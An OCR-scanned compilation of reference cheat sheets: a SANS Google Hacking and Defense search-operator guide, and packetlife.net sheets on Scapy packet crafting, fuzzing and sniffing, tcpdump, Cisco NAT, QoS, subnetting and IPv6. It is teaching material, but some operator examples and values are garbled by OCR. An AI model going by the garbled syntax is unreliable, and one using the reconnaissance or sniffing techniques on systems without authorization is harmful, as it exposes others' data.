+
+Operator Examples 
+
+
+Operator Example 
+
+Finds Pages Containing 
+
+sailboat Chesapeake bay 
+
+the words sailboat, Chesapeake and 
+
+Bay 
+
+sloop OR yawl 
+
+either the word sloop or the word yawl 
+
+“To each his own” 
+
+the exact phrase to each his own 
+
+virus -computer 
+
+the word virus but NOT the word 
+
+computer 
+
+Star Wars Episode +111 
+
+This movie title, including the roman 
+numeral III 
+
+-boat loan 
+
+loan info for both the word boat and its 
+synonyms: canoe, ferry, etc. 
+
+c/ef/#?e:sarcastic 
+
+definitions of the word sarcastic from 
+
+the Web 
+
+mac * x 
+
+the words Mac and X separated by 
+exactly one word 
+
+I’m Feeling Lucky 
+(Google link) 
+
+Takes you directly to first web page 
+returned for your query 
+
+
+Search Parameters 
+
+
+Search 
+
+Parameters 
+
+Value 
+
+Description of Use in 
+
+Google Search URLs 
+
+q 
+
+the search term 
+
+The search term 
+
+filter 
+
+0 or 1 
+
+If filter is set to 0, show 
+potentially duplicate results. 
+
+as_epq 
+
+a search phrase 
+
+The value submitted is as an 
+exact phrase. No need to 
+surround with quotes. 
+
+as_ft 
+
+i = include 
+e = exclude 
+
+The file type indicated by 
+as_filetype is included or 
+excluded in the search. 
+
+as_filetype 
+
+a file extension 
+
+The file type is included or 
+excluded in the search 
+indicated by as_ft. 
+
+as_occt 
+
+any = anywhere 
+title = page title 
+body = text of page 
+url = in the page URL 
+links = in links to 
+the page 
+
+Find the search term 
+in the specified location. 
+
+as_dt 
+
+i = include 
+
+e = exclude 
+
+The site or domain indicated 
+by as_sitesearch is included 
+or excluded in the search. 
+
+as_sitesearch 
+
+site or domain 
+
+The file type is included or 
+excluded in the search 
+indicated by as_dt . 
+
+as_qdr 
+
+m3 = three months 
+m6 = six months 
+y = past year 
+
+Locate pages updated with in 
+the specified time frame. 
+
+
+Google 
+
+Hacking and Defense 
+Cheat Sheet 
+
+Pocket Reference Guide 
+
+SANS Stay Sharp Program 
+
+http://www.sans.org 
+http://www.sans.org/staysharp 
+
+Purpose 
+
+
+This document aims to be a quick reference 
+outlining all Google operators, their 
+meaning, and examples of their usage. 
+
+
+What to use this sheet for 
+
+
+Use this sheet as a handy reference that outlines the 
+various Google searches that you can perform. It is 
+meant to support you throughout the Google Hacking 
+and Defense course and can be used as a quick 
+reference guide and refresher on all Google advanced 
+operators used in this course. The student could also 
+use this sheet as guidance in building innovative 
+operator combinations and new search techniques. 
+
+This sheet is split into these sections: 
+
+• Operator Examples 
+
+• Advanced Operators 
+
+• Number Searching 
+
+• Calculator Operators 
+
+• Search Parameters 
+
+
+References: 
+
+http://www.google.com/intl/en/help/refinesearch.html 
+
+http://johnny.ihackstuff.com 
+
+http://www.google.com/intl/en/help/cheatsheet.html 
+
+
+
+©SANS Institute 2006 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+SCAPY 
+
+
+packetlife.net 
+
+Specifying Addresses and Values 
+
+
+Basic Commands 
+
+
+ls() 
+
+List all available protocols and protocol options 
+
+lsc() 
+
+List all available scapy command functions 
+
+conf 
+
+Show/set scapy configuration parameters 
+
+Constructing Packets 
+
+f~ ~~~~~ \ 
+
+# Setting protocol fields 
+
+»> ip=IP(src="10. 0.0.1") 
+
+»> ip.dst="10.0.0.2" 
+
+# Combining layers 
+
+»> 1 3=1 P ( )/TCP( ) 
+
+»> l2=Ether( )/l3 
+
+# Splitting layers apart 
+
+»> I2.getlayer(l) 
+
+<IP frag=0 proto=tcp |<TCP |» 
+
+>» 12 . getlayer(2) 
+
+<TCP |> 
+
+Displaying Packets 
+
+( ' 
+
+# Show an entire packet 
+
+»> (Ether( )/IPv6( ) ) . show( ) 
+
+###[ Ethernet ]### 
+
+dst= ff :ff :ff :ff :ff :ff 
+src= 00:00:00:00:00:00 
+type= 0x86dd 
+###[ IPv6 ]### 
+version= 6 
+tc= 0 
+fl= 0 
+
+plen= None 
+
+nh= No Next Header 
+
+hlim= 64 
+
+src= : : 1 
+
+dst= : : 1 
+
+# Show field types with default values 
+»> ls(UDP( ) ) 
+
+sport : ShortEnumField = 1025 (53) 
+
+dport : ShortEnumField = 53 (53) 
+
+len : ShortField = None (None) 
+
+chksum : XShortField = None (None) 
+
+V y 
+
+Fuzzing 
+
+f > 
+
+# Randomize fields where applicable 
+
+»> fuzz(ICMP( ) ) . show( ) 
+
+###[ ICMP ]### 
+type= <RandByte> 
+code= 227 
+chksum= None 
+unused= <RandInt> 
+
+
+# Explicit IP address (use quotation marks) 
+
+»> IP(dst="192. 0.2.1") 
+
+# DNS name to be resolved at time of transmission 
+>» IP(dst="example.com") 
+
+# IP network (results in a packet template) 
+
+»> IP(dst="192. 0.2. 0/24") 
+
+# Random addresses with RandlPO and RandMACO 
+
+»> IP(dst=RandIP( ) ) 
+
+>» Ether(dst=RandMAC( ) ) 
+
+# Set a range of numbers to be used (template) 
+
+»> IP( ttl=( 1 , 30) ) 
+
+# Random numbers with RandlntO and RandLongO 
+>» IP(id=RandInt( ) ) 
+
+
+Sending Packets 
+
+send(pkt, inter=0, loop=0, count=l, iface=N) 
+
+Send one or more packets at layer three 
+
+sendp(pkt, inter=0, loop=0, count=l, iface=N) 
+
+Send one or more packets at layer two 
+
+sendpfast(pkt, pps=N, mbps=N, loop=0, iface=N) 
+
+Send packets much faster at layer two using tcpreplay 
+
+»> send (IP(dst=" 192 .0.2.1" )/UDP(dport=53) ) 
+
+Sent 1 packets. 
+
+>» sendp(Ether( )/IP(dst=" 192 .0.2. 1" )/UDP(dport=53) ) 
+Sent 1 packets. 
+
+
+Sending and Receiving Packets 
+
+sr(pkt, filter=N, iface=N), srp(...) 
+
+Send packets and receive replies 
+
+srl(pkt, inter=0, loop=0, count=l, iface=N), srpl(...) 
+
+Send packets and return only the first reply 
+
+srloop(pkt, timeout=N, count=N), srploop(...) 
+
+Send packets in a loop and print each reply 
+
+>» srloop(IP(dst="packetlife. net" )/ICMP( ) , count=3) 
+RECV 1: IP / ICMP 174.143.213.184 > 192.168.1.140 
+
+RECV 1: IP / ICMP 174.143.213.184 > 192.168.1.140 
+
+RECV 1: IP / ICMP 174.143.213.184 > 192.168.1.140 
+
+v 
+
+
+Sniffing Packets 
+
+sniff(count=0, store=l, timeout=N) 
+
+Record packets off the wire; returns a list of packets when stopped 
+
+# Capture up to 100 packets (or stop with ctrl-c) 
+
+»> pkts=snif f (count=100, iface="eth0" ) 
+
+>» pkts 
+
+<Sniffed : TCP:92 UDP:7 ICMP:1 Other:0> 
+
+v 
+
+
+by Jeremy Stretch 
+
+
+vl.O 
+
+
+
+TCPDUMP 
+
+
+packetlife.net 
+
+
+-A 
+
+Command Line Options 
+
+Print frame payload in ASCII -q 
+
+Quick output 
+
+-c <count> 
+
+Exit after capturing count packets 
+
+-r <file> 
+
+Read packets from file 
+
+-D 
+
+List available interfaces 
+
+-s <len> 
+
+Capture up to len bytes per packet 
+
+-e 
+
+Print link-level headers 
+
+-S 
+
+Print absolute TCP sequence numbers 
+
+-F <file> 
+
+Use file as the filter expression 
+
+-t 
+
+Don't print timestamps 
+
+-G <n> 
+
+Rotate the dump file every n seconds 
+
+-v[v[v]] 
+
+Print more verbose output 
+
+-i <iface> 
+
+Specifies the capture interface 
+
+-w <file> 
+
+Write captured packets to file 
+
+-K 
+
+Don't verify TCP checksums 
+
+-X 
+
+Print frame payload in hex 
+
+-L 
+
+List data link types for the interface 
+
+-X 
+
+Print frame payload in hex and ASCII 
+
+-n 
+
+Don't convert addresses to names 
+
+-y <type> 
+
+Specify the data link type 
+
+-P 
+
+Don't capture in promiscuous mode 
+
+-Z <user> 
+
+Drop privileges from root to user 
+
+
+Capture Filter Primitives 
+
+
+[src|dst] host <host> Matches a host as the IP source, destination, or either 
+
+ether [src|dst] host <ehost> Matches a host as the Ethernet source, destination, or either 
+
+gateway host <host> Matches packets which used host as a gateway 
+
+[src|dst] net <network>/<len> Matches packets to or from an endpoint residing in network 
+
+[tcp|udp] [src|dst] port <port> Matches TCP or UDP packets sent to/from port 
+
+[tcpjudp] [srcjdst] portrange <pl>-<p2> Matches TCP or UDP packets to/from a port in the given range 
+
+
+less <length> 
+
+Matches packets less than or equal to length 
+
+greater <length> Matches packets greater than or equal to length 
+
+(ether|ip|ip6) proto <protocol> Matches an Ethernet, IPv4, or IPv6 protocol 
+
+(ether | ip) broadcast 
+
+Matches Ethernet or IPv4 broadcasts 
+
+(ether | ip |ip6) multicast Matches Ethernet, IPv4, or IPv6 multicasts 
+
+type (mgt | ctl |data) [subtype <subtype>] Matches 802.11 frames based on type and optional subtype 
+
+vlan [<vlan>] 
+
+Matches 802. IQ frames, optionally with a VLAN ID of vlan 
+
+mpls [<label>] 
+
+Matches MPLS packets, optionally with a label of label 
+
+<expr> <relop> <expr> 
+
+Matches packets by an arbitrary expression 
+
+Protocols 
+
+arp ip6 slip 
+
+ether link tcp 
+
+fddi ppp tr 
+
+Modifiers Examples 
+
+! or not udp dst port not 53 UDP not bound for port 53 
+
+&& or and host 10.0.0.1 && host 10.0.0.2 Traffic between these hosts 
+
+|| or or tcp dst port 80 or 8080 Packets to either TCP port 
+
+icmp radio udp 
+
+ip rarp wlan 
+
+TCP Flags 
+
+tcp-urg tcp-rst 
+
+tcp-ack tcp-syn 
+
+tcp-psh tcp-fin 
+
+ICMP Types 
+
+icmp-echoreply icmp-routeradvert icmp-tstampreply 
+
+icmp-unreach icmp-routersolicit icmp-ireq 
+
+icmp-sourcequench icmp-timxceed icmp-ireqreply 
+
+icmp- redirect icmp-paramprob icmp-maskreq 
+
+icmp-echo icmp-tstamp icmp-maskreply 
+
+
+by Jeremy Stretch 
+
+
+v2.0 
+
+
+Network Address Translation packetiife.net 
+
+
+Example Topology 
+
+flfl i 
+
+1 
+
+
+i 
+
+aai 
+
+1 i 
+
+FastEthernetO 
+10.0.0.1/16 
+NAT Inside 
+
+
+
+FastEthernetl 
+
+174.143.212.1/22 
+
+NAT Outside 
+
+
+Address Classification 
+
+
+Inside Local 
+
+
+An actual address assigned to 
+an inside host 
+
+
+Inside Global 
+
+
+An inside address seen from 
+the outside 
+
+
+Outside Global 
+
+
+An actual address assigned to 
+an outside host 
+
+
+Outside Local 
+
+
+An outside address seen from 
+the inside 
+
+
+NAT Boundary Configuration 
+
+
+interface FastEthernetG 
+ip address 10.0.0.1 255.255.0.0 
+ip nat inside 
+
+I 
+
+interface FastEthernetl 
+ip address 174.143.212.1 255.255.252.0 
+ip nat outside 
+
+
+
+r 1 
+
+Perspective 
+
+Local 
+
+Global 
+
+f 
+
+C 
+
+o 
+
+05 
+
+O 
+
+O 
+
+-1 
+
+L 
+
+Inside 
+
+Inside Local 
+
+Inside Global 
+
+Outside 
+
+Outside Local 
+
+Outside Global 
+
+
+Static Source Translation 
+
+
+Terminology 
+
+
+! One line per static translation 
+
+ip nat inside source static 10.0.0.19 192.0.2.1 
+ip nat inside source static 10.0.1.47 192.0.2.2 
+ip nat outside source static 174.143.212.133 10.0.0.47 
+ip nat outside source static 174.143.213.240 10.0.2.181 
+
+
+Dynamic Source Translation 
+
+' — ' > 
+
+! Create an access list to match inside local addresses 
+
+access-list 10 permit 10.0.0.0 0.0.255.255 
+
+j 
+
+! Create NAT pool of inside global addresses 
+
+ip nat pool MyPool 192.0.2.1 192.0.2.254 prefix-length 24 
+
+! Combine them with a translation rule 
+
+ip nat inside source list 10 pool MyPool 
+
+! Dynamic translations can be combined with static entries 
+
+ip nat inside source static 10.0.0.42 192.0.2.42 
+
+v / 
+
+Port Address Translation (PAT) 
+
+/ \ 
+
+! Static layer four port translations 
+
+ip nat inside source static tcp 10.0.0.3 8080 192.0.2.1 80 
+ip nat inside source static udp 10.0.0.14 53 192.0.2.2 53 
+ip nat outside source static tcp 174.143.212.4 23 10.0.0.8 23 
+
+! 
+
+! Dynamic port translation with a pool 
+
+ip nat inside source list 11 pool MyPool overload 
+
+! 
+
+! Dynamic translation with interface overloading 
+
+ip nat inside source list 11 interface FastEthernetl overload 
+
+
+NAT Pool 
+
+A pool of IP addresses to be used as inside 
+global or outside local addresses in translations 
+
+Port Address Translation (PAT) 
+
+An extension to NAT that translates information 
+at layer four and above, such as TCP and UDP 
+port numbers; dynamic PAT configurations 
+include the overload keyword 
+
+Extendable Translation 
+The extendable keyword must be appended 
+when multiple overlapping static translations are 
+configured 
+
+Special NAT Pool Types 
+
+Rotary Used for load balancing 
+
+Match- Preserves the host portion of 
+Host the address after translation 
+
+
+Troubleshooting 
+
+show ip nat translations [verbose] 
+show ip nat statistics 
+clear ip nat translations 
+
+NAT Translations Tuning 
+
+/ \ 
+
+ip nat translation tcp-timeout <seconds> 
+ip nat translation udp-timeout <seconds> 
+ip nat translation max-entries <number> 
+
+
+Inside Destination Translation 
+
+/ \ 
+
+! Create a rotary NAT pool 
+
+ip nat pool LoadBalServers 10.0.99.200 10.0.99.203 prefix-length 24 type rotary 
+
+! Enable load balancing across inside hosts for incoming traffic 
+
+ip nat inside destination list 12 pool LoadBalServers 
+
+V / 
+
+
+by Jeremy Stretch 
+
+
+vl.O 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Quality of Service ■ Part 1 
+
+Quality of Service Models 
+
+
+packetlife.net 
+IP Type of Service (TOS) 
+
+
+Best Effort ■ No QoS policies are implemented 
+
+Integrated Services (IntServ) 
+
+Resource Reservation Protocol (RSVP) is used to reserve bandwidth per- 
+flow across all nodes in a path 
+
+Differentiated Services (DiffServ) 
+
+Packets are individually classified and marked; policy decisions are made 
+independently by each node in a path 
+
+
+Precedence 
+
+
+
+Ver 
+
+HL 
+
+TOS 
+
+Len 
+
+1 
+
+
+/ 
+
+\ 
+
+
+DSCP 
+
+
+Layer 2 QoS Markings 
+
+
+Medium Name 
+
+
+Type 
+
+
+Ethernet 
+Frame Relay 
+ATM 
+MPLS 
+
+
+Class of Service (CoS) 
+Discard Eligibility (DE) 
+Cell Loss Priority (CLP) 
+Traffic Class (TC) 
+
+
+3-bit 802. Ip field in 802. IQ header 
+1-bit drop eligibility flag 
+1-bit drop eligibility flag 
+3-bit field compatible with 802. Ip 
+
+
+IP QoS Markings 
+
+IP Precedence 
+
+The first three bits of the IP TOS field; limited to 8 traffic classes 
+
+Differentiated Services Code Point (DSCP) 
+
+The first six bits of the IP TOS are evaluated to provide more granular 
+classification; backward-compatible with IP Precedence 
+
+
+QoS Flowchart 
+
+
+
+Terminology 
+
+
+Per-Hop Behavior (PHB) 
+
+The individual QoS action performed at each independent DiffServ node 
+Trust Boundary ■ Beyond this, inbound QoS markings are not trusted 
+Tail Drop ■ Occurs when a packet is dropped because a queue is full 
+
+Policing 
+
+Imposes an artificial ceiling on the amount of bandwidth that may be 
+consumed; traffic exceeding the policer rate is reclassified or dropped 
+
+Shaping 
+
+Similar to policing but buffers excess traffic for delayed transmission; 
+makes more efficient use of bandwidth but introduces a delay 
+
+TCP Synchronization 
+
+Flows adjust TCP window sizes in synch, making inefficient use of a link 
+
+DSCP Per-Hop Behaviors 
+
+Class Selector (CS) ■ Backward-compatible with IP Precedence values 
+Assured Forwarding (AF) ■ Four classes with variable drop preferences 
+Expedited Forwarding (EF) ■ Priority queuing for delay-sensitive traffic 
+
+
+Precedence/ DSCP 
+
+
+
+Binary 
+
+DSCP 
+
+Prec. 
+
+56 
+
+111000 
+
+Reserved 
+
+7 
+
+48 
+
+110000 
+
+Reserved 
+
+6 
+
+46 
+
+101110 
+
+EF 
+
+5 
+
+32 
+
+100000 
+
+CS4 
+
+
+34 
+
+100010 
+
+AF41 
+
+4 
+
+36 
+
+100100 
+
+AF42 
+
+
+38 
+
+100110 
+
+AF43 
+
+
+24 
+
+011000 
+
+CS3 
+
+
+26 
+
+011010 
+
+AF31 
+
+3 
+
+28 
+
+011100 
+
+AF32 
+
+
+30 
+
+011110 
+
+AF33 
+
+
+16 
+
+010000 
+
+CS2 
+
+
+18 
+
+010010 
+
+AF21 
+
+2 
+
+20 
+
+010100 
+
+AF22 
+
+
+22 
+
+010110 
+
+AF23 
+
+
+8 
+
+001000 
+
+CS1 
+
+
+10 
+
+001010 
+
+AF11 
+
+1 
+
+12 
+
+001100 
+
+AF12 
+
+
+14 
+
+001110 
+
+AF13 
+
+
+0 
+
+000000 
+
+BE 
+
+0 
+
+
+Congestion Avoidance 
+
+Random Early Detection (RED) 
+
+Packets are randomly dropped 
+before a queue is full to prevent tail 
+drop; mitigates TCP 
+synchronization 
+
+Weighted RED (WRED) 
+
+RED with the added capability of 
+recognizing prioritized traffic based 
+on its marking 
+
+Class-Based WRED (CBWRED) 
+
+WRED employed inside a class- 
+based WFQ (CBWFQ) queue 
+
+
+by Jeremy Stretch 
+
+
+v2.0 
+
+
+
+
+
+packetlife.net 
+
+
+Quality of Service ■ Part 2 
+
+
+Queuing Comparison 
+
+
+
+FIFO 
+
+PQ 
+
+CQ 
+
+WFQ 
+
+CBWFQ 
+
+LLQ 
+
+Default on Interfaces 
+
+>2 Mbps 
+
+No 
+
+No 
+
+< = 2 Mbps 
+
+No 
+
+No 
+
+Number of Queues 
+
+1 
+
+4 
+
+Configured 
+
+Dynamic 
+
+Configured 
+
+Configured 
+
+Configurable Classes 
+
+No 
+
+Yes 
+
+Yes 
+
+No 
+
+Yes 
+
+Yes 
+
+Bandwidth Allocation 
+
+Automatic 
+
+Automatic 
+
+Configured 
+
+Automatic 
+
+Configured 
+
+Configured 
+
+Provides for Minimal Delay 
+
+No 
+
+Yes 
+
+No 
+
+No 
+
+No 
+
+Yes 
+
+Modern Implementation 
+
+Yes 
+
+No 
+
+No 
+
+No 
+
+Yes 
+
+Yes 
+
+
+First In First Out (FIFO) Priority Queuing (PQ) 
+
+
+LLQ Config Example 
+
+
+
+■ Packets are transmitted in the 
+order they are processed 
+
+■ No prioritization is provided 
+
+
+■ Default queuing method on high- 
+speed (>2 Mbps) interfaces 
+
+■ Configurable with the tx-ring- 
+limit interface config command 
+
+Custom Queuing (CQ) 
+
+
+Queue A 
+Queue B 
+Queue C 
+
+
+
+f 
+
+
+Hardware 
+
+Queue 
+
+
+■ Rotates through queues using 
+Weighted Round Robin (WRR) 
+
+■ Processes a configurable number 
+of bytes from each queue per turn 
+
+■ Prevents queue starvation but 
+does not provide for delay- 
+sensitive traffic 
+
+
+Class-Based WFQ (CBWFQ) 
+
+
+Queue A 
+Queue B 
+
+
+
+Default 
+
+
+Hardware 
+
+Queue 
+
+
+■ WFQ with administratively 
+configured queues 
+
+■ Each queue is allocated an 
+amount/percentage of bandwidth 
+
+■ No support for delay-sensitive 
+traffic 
+
+
+
+■> 
+
+Class Definitions 
+
+! Match packets by DSCP value 
+
+class-map match-all Voice 
+match dscp ef 
+
+I 
+
+class-map match-all Call-Signaling 
+match dscp cs3 
+
+
+■ Provides four static queues which 
+cannot be reconfigured 
+
+■ Higher-priority queues are 
+always emptied before lower- 
+priority queues 
+
+■ Lower-priority queues are at risk 
+of bandwidth starvation 
+
+Weighted Fair Queuing (WFQ) 
+
+
+
+■ Queues are dynamically created 
+per flow to ensure fair processing 
+
+
+■ Statistically drops packets from 
+aggressive flows more often 
+
+■ No support for delay-sensitive 
+traffic 
+
+
+Low Latency Queuing (LLQ) 
+
+
+Priority 
+
+Queue A ^ — ► 
+
+Queue B ^ — ► 
+
+Default ^ — ► 
+
+■ CBWFQ with the addition of a 
+policed strict-priority queue 
+
+■ Highly configurable while still 
+supporting delay-sensitive traffic 
+
+
+
+
+
+Hardware 
+
+Queue 
+
+
+
+class-map match-any Critical-Apps 
+match dscp af21 af22 
+
+! 
+
+! Match packets by access list 
+
+class-map match-all Scavenger 
+match access-group name Other 
+
+
+policy-map Foo Policy Creation 
+
+class Voice 
+
+! Priority queue policed to 33% 
+
+priority percent 33 
+class Call-Signaling 
+
+! Allocate 5% of bandwidth 
+
+bandwidth percent 5 
+class Critical-Apps 
+
+bandwidth percent 20 
+
+! Extend queue size to 96 packets 
+
+queue-limit 96 
+class Scavenger 
+
+! Police to 64 kbps 
+
+police cir 64000 
+conform-action transmit 
+exceed-action drop 
+class class-default 
+
+! Enable WFQ 
+
+fair-queue 
+
+! Enable WRED 
+
+random-detect 
+
+V 
+
+interface Serial© Policy Application 
+
+! Apply the policy in or out 
+
+service-policy output Foo 
+
+
+LLQ Config Example 
+
+show policy-map [interface] 
+
+Show interface 
+
+show queue <interface> 
+
+Show mis qos 
+
+
+by Jeremy Stretch 
+
+
+v 2.0 
+
+
+
+
+
+
+IPv4 Subnetting 
+
+
+packetlife.net 
+
+
+CIDR Subnet Mask 
+
+
+Subnets 
+
+Addresses 
+
+
+Wildcard 
+
+
+Subnet Mask 
+
+
+Decimal to Binary 
+Wildcard 
+
+
+/ 32 
+
+255.255.255.255 
+
+1 
+
+0.0. 0.0 
+
+255 
+
+1111 
+
+1111 
+
+0 
+
+0000 
+
+0000 
+
+/31 
+
+255.255.255.254 
+
+2 
+
+0.0.0. 1 
+
+254 
+
+1111 
+
+1110 
+
+1 
+
+0000 
+
+0001 
+
+/30 
+
+255.255.255.252 
+
+4 
+
+0.0. 0.3 
+
+252 
+
+1111 
+
+1100 
+
+3 
+
+0000 
+
+0011 
+
+/29 
+
+255.255.255.248 
+
+8 
+
+0.0. 0.7 
+
+248 
+
+1111 
+
+1000 
+
+7 
+
+0000 
+
+0111 
+
+/28 
+
+255.255.255.240 
+
+16 
+
+0.0.0.15 
+
+240 
+
+1111 
+
+0000 
+
+15 
+
+0000 
+
+1111 
+
+/27 
+
+255.255.255.224 
+
+32 
+
+0.0.0.31 
+
+224 
+
+1110 
+
+0000 
+
+31 
+
+0001 
+
+1111 
+
+/ 26 
+
+255.255.255.192 
+
+64 
+
+0.0.0.63 
+
+192 
+
+1100 
+
+0000 
+
+63 
+
+0011 
+
+1111 
+
+/ 25 
+
+255.255.255.128 
+
+128 
+
+0.0.0.127 
+
+128 
+
+1000 
+
+0000 
+
+127 
+
+0111 
+
+1111 
+
+/24 
+
+255.255.255.0 
+
+256 
+
+0.0.0.255 
+
+0 
+
+0000 
+
+0000 
+
+255 
+
+1111 
+
+1111 
+
+/23 
+
+255.255.254.0 
+
+512 
+
+0.0.1.255 
+
+
+
+Subnet Proportion 
+
+
+/22 
+
+255.255.252.0 
+
+1,024 
+
+0.0.3.255 
+
+
+
+
+
+
+
+
+/ 21 255.255.248.0 
+/20 255.255.240.0 
+/19 255.255.224.0 
+/18 255.255.192.0 
+/17 255.255.128.0 
+/16 255.255.0.0 
+/15 255.254.0.0 
+/14 255.252.0.0 
+/13 255.248.0.0 
+/12 255.240.0.0 
+/II 255.224.0.0 
+/10 255.192.0.0 
+/9 255.128.0.0 
+/8 255.0.0.0 
+/7 254.0.0.0 
+/6 252.0.0.0 
+/5 248.0.0.0 
+/ 4 240.0.0.0 
+/3 224.0.0.0 
+/2 192.0.0.0 
+/I 128.0.0.0 
+/0 0 . 0 . 0.0 
+
+
+2,048 0.0.7.255 
+
+4,096 0.0.15.255 
+
+8,192 0.0.31.255 
+
+16,384 0.0.63.255 
+
+32,768 0.0.127.255 
+
+65,536 0.0.255.255 
+
+131,072 0.1.255.255 
+
+262,144 0.3.255.255 
+
+524,288 0.7.255.255 
+
+1,048,576 0.15.255.255 
+
+2,097,152 0.31.255.255 
+
+4,194,304 0.63.255.255 
+
+8,388,608 0.127.255.255 
+
+16,777,216 0.255.255.255 
+
+33,554,432 1.255.255.255 
+
+67,108,864 3.255.255.255 
+
+134,217,728 7.255.255.255 
+
+268,435,456 15.255.255.255 
+
+536,870,912 31.255.255.255 
+
+1,073,741,824 63.255.255.255 
+
+2,147,483,648 127.255.255.255 
+
+4,294,967,296 255.255.255.255 
+
+Terminology 
+
+
+
+- / 29 
+i- /30 
+
+
+/30 
+
+
+Classful Ranges 
+
+A 0.0. 0.0 - 127.255.255.255 
+B 128.0.0.0 - 191.255.255.255 
+C 192.0.0.0 - 223.255.255.255 
+D 224.0.0.0 - 239.255.255.255 
+E 240.0.0.0 - 255.255.255.255 
+
+Reserved Ranges 
+
+RFC 1918 10.0.0.0 - 10.255.255.255 
+Local host 127.0.0.0 - 127.255.255.255 
+RFC 1918 172.16.0.0 - 172.31.255.255 
+RFC 1918 192.168.0.0 - 192.168.255.255 
+
+
+CIDR 
+
+Classless interdomain routing was developed to 
+provide more granularity than legacy classful 
+addressing; CIDR notation is expressed as /XX 
+
+
+VLSM 
+
+Variable-length subnet masks are an arbitrary length 
+between 0 and 32 bits; CIDR relies on VLSMs to define 
+routes 
+
+
+by Jeremy Stretch 
+
+
+v2.0 
+
+
+
+IPv6 
+
+
+packetlife.net 
+
+
+Protocol Header 
+
+
+
+8 
+
+16 
+
+24 
+
+32 
+
+Ver 
+
+Traffic Class 
+
+
+Flow Label 
+
+
+
+Payload Length 
+
+
+Next Header Hop Limit 
+
+
+
+Destination Address 
+
+
+Version (4 bits) ■ Always set to 6 
+Traffic Class (8 bits) ■ A DSCP value for QoS 
+Flow Label (20 bits) ■ Identifies unique flows (optional) 
+Payload Length (16 bits) ■ Length of the payload in bytes 
+Next Header (8 bits) ■ Header or protocol which follows 
+Hop Limit (8 bits) ■ Similar to IPv4's time to live field 
+Source Address (128 bits) ■ Source IP address 
+Destination Address (128 bits) ■ Destination IP address 
+
+Address Types 
+Unicast ■ One-to-one communication 
+Multicast ■ One-to-many communication 
+Anycast ■ An address configured in multiple locations 
+
+
+Address Notation 
+
+■ Eliminate leading zeros from all two-byte sets 
+
+■ Replace up to one string of consecutive zeros 
+with a double-colon (::) 
+
+Address Formats 
+
+Global unicast 
+
+
+Global Prefix Subnet 
+
+
+48 16 
+
+Link-local unicast 
+
+
+FE80: :/64 
+
+
+64 
+
+
+Interface ID 
+
+
+64 
+
+
+Interface ID 
+
+
+64 
+
+
+Multicast 
+
+
+</> § 
+
+t-r- Ui £ 
+
+FF ™ 8 
+u- w 
+
+
+8 4 4 
+
+
+MAC 
+
+
+EUI-64 
+
+
+Group ID 
+
+
+112 
+
+EUI-64 Formation 
+
+
+00 Oa 27 5c 88 19 
+
+
+02 Oa 27 ff fe 5c 88 19 
+
+
+Insert Oxfffe between the two halves of the MAC 
+Flip the seventh bit (universal/local flag) to 1 
+
+
+Multicast Scopes 
+
+
+1 Interface-local 
+
+2 Link-local 
+
+4 Admin-local 
+
+5 Site-local 
+
+8 Org-local 
+
+E Global 
+
+Special- 
+
+Use Ranges 
+
+::/0 
+
+Default route 
+
+::/128 
+
+Unspecified 
+
+::1/128 
+
+Loopback 
+
+::/96 
+
+IPv4-compatible* 
+
+::FFFF:0:0/96 
+
+IPv4-mapped 
+
+2001::/32 
+
+Teredo 
+
+2001:DB8::/32 
+
+Documentation 
+
+2002::/16 
+
+6to4 
+
+FC00::/7 
+
+Unique local 
+
+FE80::/10 
+
+Link-local unicast 
+
+FEC0::/10 
+
+Site-local unicast* 
+
+FF00::/8 
+
+Multicast 
+
+
+* Deprecated 
+
+
+Extension Headers 
+Hop-by-hop Options (0) 
+
+Carries additional information which must be examined by every 
+router in the path 
+
+Routing (43) 
+
+Provides source routing functionality 
+
+Fragment (44) 
+
+Included when a packet has been fragmented by its source 
+
+Encapsulating Security Payload (50) 
+
+Provides payload encryption (IPsec) 
+
+Authentication Header (51) 
+
+Provides packet authentication (IPsec) 
+
+Destination Options (60) 
+
+Carries additional information which pertains only to the recipient 
+
+Transition Mechanisms 
+
+Dual Stack 
+
+Transporting IPv4 and IPv6 across an infrastructure simultaneously 
+
+Tunneling 
+
+IPv6 traffic is encapsulated into IPv4 using IPv6-in-IP, UDP (Teredo), 
+or Intra-Site Automatic Tunnel Addressing Protocol (ISATAP) 
+
+Translation 
+
+Stateless IP/ICMP Translation (SIIT) translates IP header fields, NAT 
+Protocol Translation (NAT-PT) maps between IPv6 and IPv4 addresses 
+
+
+by Jeremy Stretch 
+
+
+v2.0 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
